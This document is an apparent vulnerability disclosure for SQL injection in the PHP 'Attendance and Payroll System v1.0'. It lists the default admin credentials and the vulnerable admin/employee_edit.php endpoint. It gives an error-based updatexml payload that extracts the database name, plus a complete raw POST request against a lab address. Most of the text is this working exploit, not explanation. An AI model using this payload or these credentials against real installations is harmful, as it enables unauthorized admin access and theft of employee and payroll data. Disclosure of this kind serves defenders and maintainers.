# Attendance and Payroll System v1.0 - SQL injection

username:nurhodelta password:password ----> {ip}apsystem/admin/index.php

Supplier： https://www.sourcecodester.com/php/12268/attendance-and-payroll-system-using-php.html

\admin\employee_edit.php has SQL injection

Payload: id=' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&firstname=1&lastname=1&address=1&birthdate=2022-03-29&contact=1&gender=Male&position=1&schedule=5&edit=

SQL injection because id can be closed

![image](https://user-images.githubusercontent.com/54017627/159262758-bee3a0b5-22ec-46d1-8d1d-7d62425e4193.png)

```sql
POST /apsystem/admin/employee_edit.php HTTP/1.1
Host: 192.168.1.17
Content-Length: 107
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.17
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.17/apsystem/admin/employee.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=2nud4pa7qt6oo5odl3120a4bta
Connection: close

id=' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&firstname=1&lastname=1&address=1&birthdate=2022-03-29&contact=1&gender=Male&position=1&schedule=5&edit=
```

![image](https://user-images.githubusercontent.com/54017627/159263137-15b6c240-4702-435a-9680-cccaf9f92488.png)

![image](https://user-images.githubusercontent.com/54017627/159262887-c17a4974-1467-467c-ae83-29a918376b49.png)
